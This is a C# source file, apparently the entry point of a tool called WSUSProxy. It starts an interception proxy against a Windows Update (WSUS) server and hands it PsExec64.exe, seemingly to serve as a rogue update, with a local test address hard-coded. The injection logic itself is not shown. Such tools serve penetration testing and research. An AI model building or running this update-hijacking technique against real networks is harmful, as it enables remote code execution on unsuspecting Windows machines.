using Microsoft.Win32;
using System;
using System.Net;
using System.Threading.Tasks;
using Titanium.Web.Proxy;
using Titanium.Web.Proxy.EventArguments;
using Titanium.Web.Proxy.Models;

namespace WSUSProxy
{
    class Program
    {
        public static int Main(string[] args)
        {
            //string wsusConfig = (string)Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\", "WUServer", null);
            string wsusConfig = "https://127.0.0.1:13337";

            string wsusHost = null;
            bool isHttps = false;
            if (wsusConfig != null)
            {
                Uri wsusURI = new Uri(wsusConfig);
                wsusHost = wsusURI.Host;
                isHttps = wsusURI.Scheme == "https" ? true : false;

                Console.WriteLine(String.Format("Detected {0} WSUS Server - {1}", wsusURI.Scheme, wsusHost));

                Proxy proxy = new Proxy(wsusHost, isHttps, @".\PsExec64.exe");
                proxy.Start();

                Console.WriteLine("Hit any key to exit..");
                Console.WriteLine();
                Console.Read();

                proxy.Stop();
            }
            else
            {
                Console.WriteLine("No WSUS Server detected.");
                Console.WriteLine("Stopping now.");
            }
            return 0;
        }
    }
}
